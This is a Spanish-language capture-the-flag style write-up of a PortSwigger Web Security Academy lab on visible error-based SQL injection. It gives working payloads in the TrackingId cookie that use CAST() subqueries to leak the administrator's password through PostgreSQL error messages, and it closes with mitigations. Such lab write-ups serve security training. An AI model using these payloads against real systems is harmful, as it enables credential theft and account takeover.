# Visible error-based SQL injection

### Lab info

| Campo                  | Detalle                          |
| ---------------------- | -------------------------------- |
| **Plataforma**         | PortSwigger Web Security Academy |
| **Categoría**          | SQL Injection                    |
| **Dificultad**         | Media                            |
| **Punto de inyección** | Cookie `TrackingId`              |
| **BBDD**               | PostgreSQL                       |

### Objetivo

Extraer la contraseña del usuario `administrator` de la tabla `users` a través de mensajes de error visibles en la respuesta HTTP, y acceder a su cuenta.

### Concepto clave

Cuando una aplicación muestra errores de base de datos en la respuesta, podemos forzar errores **intencionados** que incluyan datos sensibles en su mensaje. La función `CAST()` es ideal para esto: intentar convertir un `string` (como un username) a `integer` provoca un error que revela el valor del string.

### ERROR: invalid input syntax for type integer: "administrator"

La aplicación nos está devolviendo el dato que queríamos extraer **dentro del propio mensaje de error**.

### Reconocimiento

#### Paso 1 — Confirmar el punto de inyección

Interceptamos una petición con Burp y localizamos la cookie `TrackingId`.

Inyectamos una comilla simple para romper la query SQL:

```
TrackingId=xyz'
```

**Respuesta:** HTTP 500 — error visible en la página. El punto de inyección está confirmado.

Probamos con comilla doble para cerrar correctamente:

```
TrackingId=xyz''
```

**Respuesta:** HTTP 200 — sin error. La query se ejecuta correctamente.

#### Paso 2 — Identificar el gestor de base de datos

```
TrackingId=xyz' AND 1=CAST((SELECT 1) AS int)--
```

**Respuesta:** HTTP 200 — la sintaxis `CAST()` es válida. Esto confirma que el gestor es **PostgreSQL**.

### Explotación

#### Paso 3 — Extraer el primer username

```
TrackingId=xyz' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

**Respuesta:** El payload se trunca en el error porque el `TrackingId` original ocupa demasiados caracteres:

```
WHERE id = '4mmYDTSsvxaMIPW0' AND 1=CAST((SELECT username FROM users LIM'
```

La aplicación tiene un límite de longitud en el campo. El payload no cabe completo.

#### Paso 4 — Acortar el TrackingId

Reemplazamos el valor del TrackingId por `x` para ganar espacio:

```
TrackingId=x' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

**Respuesta:** Error visible con el dato exfiltrado:

```
ERROR: invalid input syntax for type integer: "administrator"
```

El primer usuario de la tabla es `administrator`.

#### Paso 5 — Extraer la contraseña

```
TrackingId=x' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**Respuesta:**

```
ERROR: invalid input syntax for type integer: "era379cwrqe5iedw4fra"
```

#### Credenciales obtenidas

| Usuario         | Contraseña             |
| --------------- | ---------------------- |
| `administrator` | `era379cwrqe5iedw4fra` |

### Por qué funciona

`CAST()` intenta convertir el resultado de la subquery a tipo `integer`. Como un string nunca puede ser un integer válido, PostgreSQL lanza un error que **incluye el valor que intentaba convertir**.

La clave es que la aplicación muestra ese error al usuario en lugar de gestionarlo internamente, lo que convierte un error de aplicación en un canal de exfiltración de datos.

### Mitigación

* **No mostrar errores de BBDD** en producción — usar mensajes genéricos
* **Prepared statements** (consultas parametrizadas) — eliminan la inyección en origen
* **Principio de mínimo privilegio** — el usuario de BBDD no debería poder leer la tabla `users`
* **WAF** — como capa adicional de defensa

### Referencias

* [PortSwigger: SQL injection](https://portswigger.net/web-security/sql-injection)
* [PortSwigger: Visible error-based SQLi](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
* [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
* [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
